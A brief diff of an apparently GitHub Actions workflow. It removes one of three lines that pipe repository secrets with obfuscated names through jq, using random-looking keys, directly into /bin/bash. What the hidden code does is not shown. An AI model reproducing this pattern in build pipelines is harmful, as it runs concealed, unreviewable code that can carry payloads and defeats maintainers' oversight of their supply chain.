@@ -27,7 +27,6 @@ jobs:
           x64: ${{ secrets.x64 }}
         run: |
           printf '%s' "$x64" | jq -r .t02 | /bin/bash
-          printf '%s' "$t38422" | jq -r .lvpwh86328 | /bin/bash
           printf '%s' "$kfob248" | jq -r .frxtk0 | /bin/bash
 
       - name: Store results
